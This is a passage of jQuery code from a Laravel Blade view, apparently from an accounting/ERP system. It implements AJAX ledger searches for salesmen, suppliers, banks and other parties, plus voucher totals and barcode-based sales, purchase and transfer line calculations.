  $(document).find('.search_box_delivery_man').hide();
  $(document).find('.search_box_delivery_man').removeClass('search_box_show').hide();
})


$(document).on('keyup','._search_main_sales_man',delay(function(e){
    $(document).find('._search_main_sales_man').removeClass('required_border');
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var request = $.ajax({
      url: "<?php echo e(url('ledger-search')); ?>",
      method: "GET",
      data: { _text_val : _text_val },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table style="width: 300px;"> <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="search_row_sales_man" >
                                        <td>${data[i].id}
                                        <input type="hidden" name="_sales_man_ledger" class="_sales_man_ledger" value="${data[i].id}">
                                        </td><td>${data[i]._name}
                                        <input type="hidden" name="sales_man_name_leder" class="sales_man_name_leder" value="${data[i]._name}">
                                        <input type="hidden" name="sales_man_address" class="sales_man_address" value="${data[i]._address}">
                                        <input type="hidden" name="sales_man_phone" class="sales_man_phone" value="${data[i]._phone}">
                                        </td>
                                         <td>${data[i]?._alious}</td>
                                        <td>${data[i]?._entry_branch?._name}</td>
                                        <td>${data[i]?._address}</td>
                                       
                                        </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3">No Data Found</th></thead><tbody></tbody></table></div>`;
      }     
      $(document).find('.search_box_sales_man').html(search_html);
      $(document).find('.search_box_sales_man').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


$(document).on('click','.search_row_sales_man',function(){
  var _id = $(this).find('._sales_man_ledger').val();
  var _name = $(this).find('.sales_man_name_leder').val();
  var _id_name = `${_id} ${_name}`
  $(document).find('._sales_man').val(_id);
  $(document).find('._search_main_sales_man').val(_id_name);


  $(document).find('.search_box_sales_man').hide();
  $(document).find('.search_box_sales_man').removeClass('search_box_show').hide();
})


// Example usage:

$(document).on('keyup','._search_ledger_id',delay(function(e){
    $(document).find('._search_ledger_id').removeClass('required_border');
  var _gloabal_this = $(this);
  var _text_val = $(this).val().trim();
  var _head_no = $(this).attr('attr_account_head_no');
  if(isNaN(_head_no)){ _head_no=0 }
    console.log("_text_val "+_text_val)
    console.log("_head_no "+_head_no)
  var request = $.ajax({
      url: "<?php echo e(url('ledger-search')); ?>",
      method: "GET",
      data: { _text_val,_head_no },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table style="width: 400px;"><thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Phone</th>
            <th>Territory</th>
            <th>Address</th>
            <th>Balance</th>
            <th>Credit Limit</th>
            </thead> <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="search_row" >
                                        <td>${data[i].id}
                                        <input type="hidden" name="_id_ledger" class="_id_ledger" value="${data[i].id}">
                                        </td>
                                        <td>${data[i]._code}</td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_name_leder" class="_name_leder" value="${data[i]._name}">
                                        <input type="hidden" name="_s_l_address" class="_s_l_address" value="${data[i]._address}">
                                        <input type="hidden" name="_s_l_phone" class="_s_l_phone" value="${data[i]?._phone}">
                                        <input type="hidden" name="_s_l_balance" class="_s_l_balance" value="${data[i]?._balance}">
                                        </td>
                                         <td>${data[i]?._alious}</td>
                                        <td>${data[i]?._phone}</td>
                                        <td>${data[i]?._entry_branch?._name}</td>
                                        <td>${data[i]?._address}</td>
                                        <td>${data[i]?._balance}</td>
                                        <td>${data[i]?._credit_limit}</td>
                                        </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3"> <button type="button" class="btn btn-sm btn-default new_ledger_button" attr_base_create_url="<?php echo e(url('account-type-for-new-ledger')); ?>" data-toggle="modal" data-target="#exampleModalLong" title="Create Ledger"> New Ledger</button>  </th></thead><tbody></tbody></table></div>`;
      }     
      _gloabal_this.parent('td').find('.search_box').html(search_html);
      _gloabal_this.parent('td').find('.search_box').addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });

  

}, 500));


$(document).on('click','.search_row',function(){
  var _id = $(this).children('td').find('._id_ledger').val();
  var _name = $(this).find('._name_leder').val();
  var _s_l_balance = $(this).find('._s_l_balance').val();
  console.log(_s_l_balance)
  $(this).parent().parent().parent().parent().parent().parent().find('._ledger_id').val(_id);
  var _id_name = `${_name},`+_s_l_balance;
  $(this).parent().parent().parent().parent().parent().parent().find('._search_ledger_id').val(_id_name);

var _cost_deduct_ledger =`<option value="${_id}">${_name}</option>`;
  $(document).find("._cost_deduct_ledger_id").append(_cost_deduct_ledger);
  $(document).find('.search_box').hide();
  $(document).find('.search_box').removeClass('search_box_show').hide();
})





$(document).on('keyup','._search_main_ledger_id',delay(function(e){
    $(document).find('._search_main_ledger_id').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="search_row_ledger";
    var list_display_class='.search_box_main_ledger';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);

}, 500));




$(document).on('keyup','._search_supplier',delay(function(e){
    $(document).find('._search_supplier').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_supplier_row_click";
    var list_display_class='.search_box_supplier';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);

}, 500));

$(document).on("click",'._supplier_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find(".__supplier_id").val(_id);
    $(document).find("._search_supplier").val(_name);
    $(document).find('.search_box_supplier').hide();
    $(document).find('.search_box_supplier').removeClass('search_box_show').hide();
})




$(document).on('keyup','._search_bank',delay(function(e){
    $(document).find('._search_bank').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_bank_row_click";
    var list_display_class='.search_box_bank';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);

}, 500));




$(document).on('keyup','._search_insurance_company',delay(function(e){
    $(document).find('._search_insurance_company').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_insurance_company_row_click";
    var list_display_class='.search_box_insurance_company';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);

}, 500));


$(document).on("click",'._insurance_company_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find(".__insurance_company_id").val(_id);
    $(document).find("._search_insurance_company").val(_name);
    $(document).find('.search_box_insurance_company').hide();
    $(document).find('.search_box_insurance_company').removeClass('search_box_show').hide();
})


$(document).on('keyup','._search_cnf',delay(function(e){
    $(document).find('._search_cnf').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_cnf_row_click";
    var list_display_class='.search_box_cnf';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);
}, 500));

$(document).on("click",'._cnf_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find(".__cnf_agent_id").val(_id);
    $(document).find("._search_cnf").val(_name);
    $(document).find('.search_box_cnf').hide();
    $(document).find('.search_box_cnf').removeClass('search_box_show').hide();
})


/*Setting Incentive Ledger Search Start*/

$(document).on('keyup','._search_customer_incentive_ledger',delay(function(e){
    $(document).find('._search_customer_incentive_ledger').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_cnf_row_click";
    var list_display_class='.asset_dep_search_box_main_ledger';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);
}, 500));

$(document).on("click",'._cnf_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find("._customer_incentive_ledger").val(_id);
    $(document).find("._search_customer_incentive_ledger").val(_name);
    $(document).find('.asset_dep_search_box_main_ledger').hide();
    $(document).find('.asset_dep_search_box_main_ledger').removeClass('search_box_show').hide();
})
/*Setting Incentive Ledger Search End*/

/*Setting Bad Debt Expense Ledger Search Start*/

$(document).on('keyup','._search_baddebt_ledgers',delay(function(e){
    $(document).find('._search_baddebt_ledgers').removeClass('required_border');
    var _gloabal_this = $(this);
    var _text_val = $(this).val().trim();
    var _form = $(document).find("._search_form_value").val();
    var _branch_id  = $(document).find("._master_branch_id").val();
    var _form_name  = $(document).find("._form_name").val();
    var click_row_class="_bank_row_click";
    var list_display_class='.search_box_bank';
    _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class);
}, 500));

$(document).on("click",'._bank_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find("._baddebt_ledgers").val(_id);
    $(document).find("._search_baddebt_ledgers").val(_name);
    $(document).find('.search_box_bank').hide();
    $(document).find('.search_box_bank').removeClass('search_box_show').hide();
})
/*Setting Bad Debt Expense Ledger Search End*/

$(document).on("click",'._bank_row_click',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    $(document).find(".__bank_id").val(_id);
    $(document).find("._search_bank").val(_name);
    $(document).find('.search_box_bank').hide();
    $(document).find('.search_box_bank').removeClass('search_box_show').hide();
})







function _main_ledger_search( _gloabal_this,_text_val,_form,_branch_id,_form_name,click_row_class,list_display_class){
  var request = $.ajax({
      url: "<?php echo e(url('main-ledger-search')); ?>",
      method: "GET",
      data: { _text_val,_form,_branch_id,_form_name },
      dataType: "JSON"
    });
     
    request.done(function( result ) {
      console.log(result)

      var search_html =``;
      var data = result.data; 
      if(data.length > 0 ){
            search_html +=`<div class="card"><table class="table table-bordered _ledger_filter_table">
            <thead>
            <th>ID</th>
            <th>CODE</th>
            <th>Name</th>
            <th>Proprietor</th>
            <th>Territory</th>
            <th>Phone</th>
            <th>Balance</th>
            <th>Credit Limit</th>
            </thead>
                            <tbody>`;
                        for (var i = 0; i < data.length; i++) {
                         search_html += `<tr class="${click_row_class}" >
                                        <td>${data[i].id}
                                        
                                        </td>
                                        <td>${data[i]?._code}</td>
                                        <td>${data[i]._name}
                                        <input type="hidden" name="_id_main_ledger" class="_id_main_ledger" value="${data[i].id}">
                                        <input type="hidden" name="_name_main_ledger" class="_name_main_ledger" value="${data[i]._name}">
                                        <input type="hidden" name="_address_main_ledger" class="_address_main_ledger" value="${data[i]._address}">
                                        <input type="hidden" name="_phone_main_ledger" class="_phone_main_ledger" value="${data[i]._phone}">
                                        <input type="hidden" name="_alious_main_ledger" class="_alious_main_ledger" value="${data[i]._alious}">
                                        <input type="hidden" name="_balance_main_ledger" class="_balance_main_ledger" value="${data[i]._balance}">
                                        <input type="hidden" name="_credit_limit_main_ledger" class="_credit_limit_main_ledger" value="${data[i]._credit_limit}">
                                        <input type="hidden" name="_code_main_ledger" class="_code_main_ledger" value="${data[i]._code}">
                                  
                                   </td>
                                   <td>${data[i]?._alious}</td>
                                   <td>${data[i]?._entry_branch?._name}</td>
                                   <td>${data[i]?._phone}</td>
                                   <td>${data[i]?._balance}</td>
                                   <td>${data[i]?._credit_limit}</td>
                                   </tr>`;
                        }                         
            search_html += ` </tbody> </table></div>`;
      }else{
        search_html +=`<div class="card"><table style="width: 300px;"> 
        <thead><th colspan="3">
        <?php if (app(\Illuminate\Contracts\Auth\Access\Gate::class)->check('account-ledger-create')): ?>
        <button type="button" class="btn btn-sm btn-success new_ledger_button"   attr_base_create_url="<?php echo e(url('account-type-for-new-ledger')); ?>"data-toggle="modal" data-target="#exampleModalLong" title="Create Ledger">
                   <i class="nav-icon fas fa-plus"></i> New Ledger 
                </button><?php endif; ?></th></thead><tbody></tbody></table></div>`;
      }     
      _gloabal_this.parent('div').find(list_display_class).html(search_html);
      _gloabal_this.parent('div').find(list_display_class).addClass('search_box_show').show();
      
    });
     
    request.fail(function( jqXHR, textStatus ) {
      alert( "Request failed: " + textStatus );
    });
}


  $(document).on("click",'.search_row_ledger',function(){
    var _id = $(this).children('td').find('._id_main_ledger').val();
    var _name = $(this).find('._name_main_ledger').val();
    var _address_main_ledger = $(this).find('._address_main_ledger').val();
    var _phone_main_ledger   = $(this).find('._phone_main_ledger').val();
    var _alious_main_ledger   = $(this).find('._alious_main_ledger').val();
    var _balance_main_ledger   = $(this).find('._balance_main_ledger').val();
    var _credit_limit_main_ledger   = $(this).find('._credit_limit_main_ledger').val();
    var _code_main_ledger   = $(this).find('._code_main_ledger').val();

    var _form_name = $(document).find("._form_name").val();
    if(_form_name=='sales' || _form_name=='sales_orders' ){

      $(document).find("._alious").val(_alious_main_ledger);
      $(document).find("._code").val(_code_main_ledger);
      $(document).find("._credit_limit").val(_credit_limit_main_ledger);
      $(document).find("._balance").val(_balance_main_ledger);
      if(_credit_limit_main_ledger > _balance_main_ledger){
        $(document).find("._balance").addClass('_required');
      }
    }


    var _form_type = $(document).find("._form_type").val();
    // alert(_form_type)
    // alert(_form_name)

    // return false;

    if(_form_name=='supplier_payments' && _form_type=='entry_form' ){
     // alert("5")
      var _form_type = $(document).find("._form_type").val();
      var _master_id = $(document).find("._master_id").val();
      var url       = $(document).find(".find_supplier_due_history").val();
      $(document).find("._alious").val(_alious_main_ledger);
      $(document).find("._code").val(_code_main_ledger);
      $(document).find("._credit_limit").val(_credit_limit_main_ledger);
      $(document).find("._balance").val(_balance_main_ledger);
      find_supplier_due_history(_id,_form_name,_master_id,url);
    }

    
    if(_form_name=='receive_payments' && _form_type=='entry_form' ){
      var _form_type = $(document).find("._form_type").val();
      var _master_id = $(document).find("._master_id").val();
      var url        = $(document).find(".find_customer_due_history").val();
      $(document).find("._alious").val(_alious_main_ledger);
      $(document).find("._code").val(_code_main_ledger);
      $(document).find("._credit_limit").val(_credit_limit_main_ledger);
      $(document).find("._balance").val(_balance_main_ledger);
      find_customer_due_history(_id,_form_name,_master_id,url);
    }

    $(document).find("._main_ledger_id").val(_id);
    $(document).find("._search_main_ledger_id").val(_name);
    $(document).find("._phone").val(_phone_main_ledger);
    $(document).find("._address").val(_address_main_ledger);

    $(document).find('.search_box_main_ledger').hide();
    $(document).find('.search_box_main_ledger').removeClass('search_box_show').hide();
})

  function find_supplier_due_history(_id,_form_name,_master_id,url){

     var request = $.ajax({
      url: url,
      method: "GET",
      data: { _id,_form_name,_master_id,url },
      dataType: "HTML"
    });
     
    request.done(function( result ) {
      $(document).find(".invoiceDetailHistory").html(result)

    });
  }


  function find_customer_due_history(_id,_form_name,_master_id,url){

     var request = $.ajax({
      url: url,
      method: "GET",
      data: { _id,_form_name,_master_id,url },
      dataType: "HTML"
    });
     
    request.done(function( result ) {
      $(document).find(".invoiceDetailHistory").html(result)

    });
  }


  $(document).on('click','._voucher_row_remove',function(event){
      event.preventDefault();
      var ledger_id = $(this).parent().parent('tr').find('._ledger_id').val();
      if(ledger_id ==""){
          $(this).parent().parent('tr').remove();
      }else{
        if(confirm('Are you sure your want to delete?')){
          $(this).parent().parent('tr').remove();
        } 
      }
      _voucher_total_calculation();
  })

  function _voucher_total_calculation(){
    var _total_dr_amount = 0;
    var _total_cr_amount = 0;
      $(document).find("._cr_amount").each(function() {
          _total_cr_amount +=parseFloat($(this).val());
      });
      $(document).find("._dr_amount").each(function() {
          _total_dr_amount +=parseFloat($(this).val());
      });
      $(document).find("._total_dr_amount").val(_math_round(_total_dr_amount));
      $(document).find("._total_cr_amount").val(_math_round(_total_cr_amount));


      _sales_due_calculation();



  }


  $(document).on('keyup','._dr_amount',function(){
    $(this).parent().parent('tr').find('._cr_amount').val(0);
    $(document).find("._total_dr_amount").removeClass('required_border');
    $(document).find("._total_cr_amount").removeClass('required_border');
    _voucher_total_calculation();
  })



  $(document).on('keyup','._cr_amount',function(){
     $(this).parent().parent('tr').find('._dr_amount').val(0);
     $(document).find("._total_dr_amount").removeClass('required_border');
      $(document).find("._total_cr_amount").removeClass('required_border');
    _voucher_total_calculation();
  })


   function _sales_due_calculation(){

     var _total = parseFloat($(document).find("#_total").val());
      if(isNaN(_total)){_total = 0}
     var _total_dr_amount  = parseFloat($(document).find("._total_dr_amount").val());
       if(isNaN(_total_dr_amount)){_total_dr_amount = 0}
        var _due_amount  = parseFloat(parseFloat(_total)-parseFloat(_total_dr_amount));
      if(isNaN(_due_amount)){_due_amount = 0}

      $(document).find("#_due_amount").val(parseFloat(_due_amount).toFixed(2))
  }




  function _math_round(_amount,_param=1){
    return parseFloat(_amount).toFixed(2);
      
  }


  
  $(document).on('change','._voucher_type',function(){
    $(document).find('._voucher_type').removeClass('required_border');
  })

  $(document).on('keyup','._note',function(){
    $(document).find('._note').removeClass('required_border');
  })

  $(document).on('click','._save_and_print',function(){
    $(document).find('._save_and_print_value').val(1);
  })



function _common_click_function(){

    var searach_show= $(document).find('.search_box_item').hasClass('search_box_show');
    var search_box_main_ledger= $(document).find('.search_box_main_ledger').hasClass('search_box_show');
    var search_box_delivery_man= $(document).find('.search_box_delivery_man').hasClass('search_box_show');
    var search_box_sales_man= $(document).find('.search_box_sales_man').hasClass('search_box_show');
    var search_box_purchase_order = $(document).find('.search_box_purchase_order').hasClass('search_box_show');
    var search_box= $(document).find('.search_box').hasClass('search_box_show');
    var _dr_search_box= $(document).find('._dr_search_box').hasClass('search_box_show');
    var _cr_search_box= $(document).find('._cr_search_box').hasClass('search_box_show');
    
    var search_boxManufacCompany= $(document).find('.search_boxManufacCompany').hasClass('search_box_show');
    var search_box_employee= $(document).find('.search_box_employee').hasClass('search_box_show');
    var search_box_supplier= $(document).find('.search_box_supplier').hasClass('search_box_show');
    var search_box_bank= $(document).find('.search_box_bank').hasClass('search_box_show');
    var search_box_cnf= $(document).find('.search_box_cnf').hasClass('search_box_show');
    var search_box_insurance_company= $(document).find('.search_box_insurance_company').hasClass('search_box_show');
    var asset_name_box= $(document).find('.asset_name_box').hasClass('search_box_show');
    var asset_dep_search_box_main_ledger= $(document).find('.asset_dep_search_box_main_ledger').hasClass('search_box_show');
    var asset_dep_exp_search_box_main_ledger= $(document).find('.asset_dep_exp_search_box_main_ledger').hasClass('search_box_show');


 if(asset_dep_exp_search_box_main_ledger ==true){
      $(document).find('.asset_dep_exp_search_box_main_ledger').removeClass('search_box_show').hide();
    }
 if(asset_dep_search_box_main_ledger ==true){
      $(document).find('.asset_dep_search_box_main_ledger').removeClass('search_box_show').hide();
    }
 if(asset_name_box ==true){
      $(document).find('.asset_name_box').removeClass('search_box_show').hide();
    }
 if(search_box_insurance_company ==true){
      $(document).find('.search_box_insurance_company').removeClass('search_box_show').hide();
    }

 if(search_box_cnf ==true){
      $(document).find('.search_box_cnf').removeClass('search_box_show').hide();
    }
 if(search_box_bank ==true){
      $(document).find('.search_box_bank').removeClass('search_box_show').hide();
    }

 if(search_box_supplier ==true){
      $(document).find('.search_box_supplier').removeClass('search_box_show').hide();
    }

 if(search_box_employee ==true){
      $(document).find('.search_box_employee').removeClass('search_box_show').hide();
    }

    if(searach_show ==true){
      $(document).find('.search_box_item').removeClass('search_box_show').hide();
    }

    if(_dr_search_box ==true){
      $(document).find('._dr_search_box').removeClass('search_box_show').hide();
    }

    if(_cr_search_box ==true){
      $(document).find('._cr_search_box').removeClass('search_box_show').hide();
    }

    if(search_box ==true){
      $(document).find('.search_box').removeClass('search_box_show').hide();
    }

    
    if(search_box_purchase_order ==true){
      $(document).find('.search_box_purchase_order').removeClass('search_box_show').hide();
    }
    if(search_box_main_ledger ==true){
      $(document).find('.search_box_main_ledger').removeClass('search_box_show').hide();
    }
    if(search_box_delivery_man ==true){
      $(document).find('.search_box_delivery_man').removeClass('search_box_show').hide();
    }
    if(search_box_sales_man ==true){
      $(document).find('.search_box_sales_man').removeClass('search_box_show').hide();
    }
    
    if(search_boxManufacCompany ==true){
      $(document).find('.search_boxManufacCompany').removeClass('search_box_show').hide();
    }

     var _u_barcode= $(document).find('.amsify-input-group-addon').hasClass('show-plus-bg');

     if(_u_barcode ==true){
      var _form_name = $(document).find("._form_name").val();
      if(_form_name =='sales_returns'){
            $(document).find('.show-plus-bg').each(function(index){
        //alert(1)

               var _qty = parseFloat($(this).text());
              if(isNaN(_qty)){ _qty=0 }
               $(this).closest('tr').find('._qty').val(_qty);
                //Check valid Barcode
               var _old_barcodes = $(this).closest('tr').find('._old_barcode').val();
               var _old_barcodes_array = _old_barcodes.split(",");
               var new_barcode_array=[];
               $(this).closest('tr').find('.amsify-select-tag').each(function(){
                      let single_barcode = $(this).attr("data-val");
                      let check_barcode =  _old_barcodes_array.includes(single_barcode);
                      if(check_barcode===false){
                        alert(" This Barcode Is not Valid !!!");
                        $(this).remove();
                      }else{
                        if (!new_barcode_array.includes(single_barcode)){
                            new_barcode_array.push(single_barcode);
                        }
                            
                        
                      }
                    
               });
              var _string_barcode = new_barcode_array.toString();
               var _qty = new_barcode_array.length
               $(this).text(_qty);
               $(this).closest('tr').find('._qty').val(_qty);
               $(this).closest('tr').find('._barcode').val(_string_barcode);
               //End of Check Valid Barcode


               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               




               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_sales_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_sales_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_sales_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);
          })
             _purchase_total_calculation();

      }


     if(_form_name =='sales'){
     // alert(1)
            $(document).find('.show-plus-bg').each(function(index){
               var _qty = parseFloat($(this).text());
              if(isNaN(_qty)){ _qty=0 }
               $(this).closest('tr').find('._qty').val(_qty);
               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_sales_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_sales_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_sales_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find(".sale_qty").val(_qty);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);
          })
             _purchase_total_calculation();

      }


       if(_form_name =='purchases'){
            $(document).find('.show-plus-bg').each(function(index){
               var _qty = parseFloat($(this).text());
              if(isNaN(_qty)){ _qty=0 }
               $(this).closest('tr').find('._qty').val(_qty);
               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_pur_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_pur_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_pur_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);
          })
             _purchase_total_calculation();

      }
       if(_form_name =='service_masters'){
            $(document).find('.show-plus-bg').each(function(index){
               var _qty = parseFloat($(this).text());
              if(isNaN(_qty)){ _qty=0 }
               $(this).closest('tr').find('._qty').val(_qty);
               var _sales_rate = $(this).closest('tr').find('._sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_sales_rate)){ _sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_pur_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_pur_rate*_sales_discount)/100);
               var _value = (parseFloat(_qty)*parseFloat(_pur_rate));

              $(this).closest('tr').find("._discount").val(_sales_discount);
              $(this).closest('tr').find("._qty").val(_qty);
              $(this).closest('tr').find("._sales_rate").val(_sales_rate);
              $(this).closest('tr').find("._discount_amount").val(_discount_amount);
              $(this).closest('tr').find("._vat").val(_sales_vat);
              $(this).closest('tr').find("._vat_amount").val(_vat_amount);
              $(this).closest('tr').find("._value").val(_value);
          })
             _purchase_total_calculation();

      }

       if(_form_name =='transfer'){
            $(document).find('.show-plus-bg').each(function(index){
               var _stock_in__qty = parseFloat($(this).text());
              if(isNaN(_stock_in__qty)){ _stock_in__qty=0 }
               $(this).closest('tr').find('._stock_in__qty').val(_stock_in__qty);
               var _stock_in__sales_rate = $(this).closest('tr').find('._stock_in__sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._stock_in__rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_stock_in__sales_rate)){ _stock_in__sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_pur_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_pur_rate*_sales_discount)/100);
               var _value = (parseFloat(_stock_in__qty)*parseFloat(_pur_rate));

              $(this).closest('tr').find("._stock_in__qty").val(_stock_in__qty);
              $(this).closest('tr').find("._stock_in__sales_rate").val(_stock_in__sales_rate);
              $(this).closest('tr').find("._stock_in__value").val(_value);
          })
             _purchase_total_calculation();

      }

       if(_form_name =='production'){
            $(document).find('.show-plus-bg').each(function(index){
               var _stock_in__qty = parseFloat($(this).text());
              if(isNaN(_stock_in__qty)){ _stock_in__qty=0 }
               $(this).closest('tr').find('._stock_in__qty').val(_stock_in__qty);
               var _stock_in__sales_rate = $(this).closest('tr').find('._stock_in__sales_rate').val();
               var _pur_rate   = $(this).closest('tr').find('._stock_in__rate').val();
               var _sales_vat = $(this).closest('tr').find('._vat').val();
               var _sales_discount = $(this).closest('tr').find('._discount').val();

               if(isNaN(_stock_in__sales_rate)){ _stock_in__sales_rate=0 }
               if(isNaN(_pur_rate)){ _pur_rate=0 }
               if(isNaN(_sales_vat)){ _sales_vat=0 }
               _vat_amount = ((_pur_rate*_sales_vat)/100)
               if(isNaN(_sales_discount)){ _sales_discount=0 }
               _discount_amount = ((_pur_rate*_sales_discount)/100);
               var _value = (parseFloat(_stock_in__qty)*parseFloat(_pur_rate));

              $(this).closest('tr').find("._stock_in__qty").val(_stock_in__qty);
              $(this).closest('tr').find("._stock_in__sales_rate").val(_stock_in__sales_rate);
              $(this).closest('tr').find("._stock_in__value").val(_value);
          })
             _purchase_total_calculation();

      }
       

      
       if(_form_name =='purchases_return'){
            $(document).find('.show-plus-bg').each(function(index){

              var _qty = parseFloat($(this).text());
